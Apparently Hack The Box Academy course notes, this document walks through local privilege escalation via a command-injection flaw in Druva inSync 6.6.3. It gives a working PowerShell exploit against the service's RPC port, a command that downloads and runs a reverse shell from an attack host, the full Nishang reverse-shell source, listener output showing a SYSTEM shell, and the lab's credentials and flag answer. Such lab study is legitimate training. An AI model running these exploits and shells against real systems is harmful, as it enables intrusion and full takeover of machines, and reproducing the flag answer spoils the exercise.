# Vulnerable Services
### Enumerating Installed Programs

```cmd
C:\htb> wmic product get name

Name
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4023057)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Druva inSync 6.6.3
Microsoft Update Health Tools
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910
Update for Windows 10 for x64-based Systems (KB4480730)
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
```

The `Druva inSync` application version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service.

### Enumerating Local Ports

```cmd
C:\htb> netstat -ano | findstr 6064

  TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3324
  TCP    127.0.0.1:6064         127.0.0.1:50274        ESTABLISHED     3324
  TCP    127.0.0.1:6064         127.0.0.1:50510        TIME_WAIT       0
  TCP    127.0.0.1:6064         127.0.0.1:50511        TIME_WAIT       0
  TCP    127.0.0.1:50274        127.0.0.1:6064         ESTABLISHED     3860
```

### Enumerating Process ID

```powershell
PS C:\htb> get-process -Id 3324

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    149      10     1512       6748              3324   0 inSyncCPHwnet64
```

### Enumerating Running Service
At this point, we have enough information to determine that the `Druva inSync` application is indeed installed and running, but we can do one last check using the `Get-Service` cmdlet.

```powershell
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

## Druva inSync Windows Client Local Privilege Escalation Example
### Druva inSync PowerShell PoC
With this information in hand, let's try out the exploit PoC, which is this short PowerShell snippet.

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### Modifying PowerShell PoC
Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):

```shellsession
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Modify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

### Starting a Python Web Server
Next, start a Python web server in the same directory where our shell.ps1 script resides.

```shellsession
masterofblafu@htb[/htb]$ python3 -m http.server 8080
```

### Catching a SYSTEM Shell
Finally, start a Netcat listener on the attack box and execute the PoC PowerShell script on the target host (after modifying the PowerShell execution policy with a command such as `Set-ExecutionPolicy Bypass -Scope Process`). We will get a reverse shell connection back with `SYSTEM` privileges if all goes to plan.

```shellsession
masterofblafu@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.


PS C:\WINDOWS\system32>whoami

nt authority\system


PS C:\WINDOWS\system32> hostname

WINLPE-WS01
```

## Questions
RDP to 10.129.43.44 (ACADEMY-WINLPE-WS01), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Work through the steps above to escalate privileges on the target system using the Druva inSync flaw. Submit the contents of the flag in the VulServices folder on the Administrator Desktop. **Answer: Aud1t_th0se_th1rd_paRty_s3rvices!**
   - On the victim, save `exploit.ps1` as the Druva inSync PowerShell PoC script and the `$cmd` to download a reverse shell from our attack host:
        ```
        $ErrorActionPreference = "Stop"

        $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.131:8080/shell.ps1')"

        $s = New-Object System.Net.Sockets.Socket(
            [System.Net.Sockets.AddressFamily]::InterNetwork,
            [System.Net.Sockets.SocketType]::Stream,
            [System.Net.Sockets.ProtocolType]::Tcp
        )
        $s.Connect("127.0.0.1", 6064)

        $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
        $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
        $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
        $length = [System.BitConverter]::GetBytes($command.Length);

        $s.Send($header)
        $s.Send($rpcType)
        $s.Send($length)
        $s.Send($command)
        ```
   - At the attack host, save this reverse shell script with the listening `IP:PORT` appended at the end:
        ```
        function Invoke-PowerShellTcp 
        { 
        <#
        .SYNOPSIS
        Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 

        .DESCRIPTION
        This script is able to connect to a standard netcat listening on a port when using the -Reverse switch. 
        Also, a standard netcat can connect to this script Bind to a specific port.

        The script is derived from Powerfun written by Ben Turner & Dave Hardy

        .PARAMETER IPAddress
        The IP address to connect to when using the -Reverse switch.

        .PARAMETER Port
        The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

        .EXAMPLE
        PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

        Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
        the given IP and port. 

        .EXAMPLE
        PS > Invoke-PowerShellTcp -Bind -Port 4444

        Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

        .EXAMPLE
        PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

        Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
        listening on the given IP and port. 

        .LINK
        http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
        https://github.com/nettitude/powershell/blob/master/powerfun.ps1
        https://github.com/samratashok/nishang
        #>      
            [CmdletBinding(DefaultParameterSetName="reverse")] Param(

                [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
                [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
                [String]
                $IPAddress,

                [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
                [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
                [Int]
                $Port,

                [Parameter(ParameterSetName="reverse")]
                [Switch]
                $Reverse,

                [Parameter(ParameterSetName="bind")]
                [Switch]
                $Bind

            )

            
            try 
            {
                #Connect back if the reverse switch is used.
                if ($Reverse)
                {
                    $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
                }

                #Bind to the provided port if Bind switch is used.
                if ($Bind)
                {
                    $listener = [System.Net.Sockets.TcpListener]$Port
                    $listener.start()    
                    $client = $listener.AcceptTcpClient()
                } 

                $stream = $client.GetStream()
                [byte[]]$bytes = 0..65535|%{0}

                #Send back current username and computername
                $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
                $stream.Write($sendbytes,0,$sendbytes.Length)

                #Show an interactive PowerShell prompt
                $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
                $stream.Write($sendbytes,0,$sendbytes.Length)

                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
                {
                    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                    $data = $EncodedText.GetString($bytes,0, $i)
                    try
                    {
                        #Execute the command on the target.
                        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                    }
                    catch
                    {
                        Write-Warning "Something went wrong with execution of command on the target." 
                        Write-Error $_
                    }
                    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                    $x = ($error[0] | Out-String)
                    $error.clear()
                    $sendback2 = $sendback2 + $x

                    #Return the results
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                    $stream.Write($sendbyte,0,$sendbyte.Length)
                    $stream.Flush()  
                }
                $client.Close()
                if ($listener)
                {
                    $listener.Stop()
                }
            }
            catch
            {
                Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
                Write-Error $_
            }
        }

        Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.131 -Port 9443
        ```
   - At the attack host, host the reverse shell and start a listener to catch the shell:
        ```shellsession
        $ python -m http.server 8080
        $ nc -nlvp 9443
        ```
   - At the victim, execute the `exploit.ps1` to get a reverse shell back at our listener:
        ```powershell
        PS C:\User\htb-student> ./exploit.ps1
        ```
        ```shellsession
        $ nc -nlvp 9443
        Listening on 0.0.0.0 9443
        Connection received on 10.129.43.44 50590
        Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
        Copyright (C) 2015 Microsoft Corporation. All rights reserved.

        PS C:\WINDOWS\system32>whoami
        nt authority\system
        PS C:\WINDOWS\system32> more C:\Users\Administrator\Desktop\VulServices\flag.txt
        Aud1t_th0se_th1rd_paRty_s3rvices!
        ```